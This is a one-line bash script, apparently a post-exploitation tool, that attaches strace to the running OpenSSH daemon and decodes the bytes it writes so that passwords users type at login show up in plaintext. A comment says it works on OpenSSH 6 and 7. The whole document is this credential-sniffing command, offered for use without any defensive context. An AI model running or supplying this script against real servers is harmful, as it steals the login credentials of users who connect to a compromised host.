#!/bin/bash
#
# This one seems pretty effective for OpenSSH 6 and 7.

strace -xx -fp `cat /var/run/sshd.pid` 2>&1 | grep --line-buffered -P 'write\(4, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
